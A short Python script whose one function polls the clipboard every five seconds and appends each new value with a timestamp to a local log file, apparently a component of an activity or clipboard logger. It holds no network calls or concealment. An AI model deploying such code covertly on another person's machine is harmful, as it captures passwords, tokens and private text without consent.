import pyperclip
import time

def logClipboard():
    recentValue = ""
    while True:
        time.sleep(5)
        currentValue = pyperclip.paste()
        if currentValue != recentValue:
            recentValue = currentValue
            with open("logs/clipBoard.txt", "a") as logFile:
                logFile.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {recentValue}\n')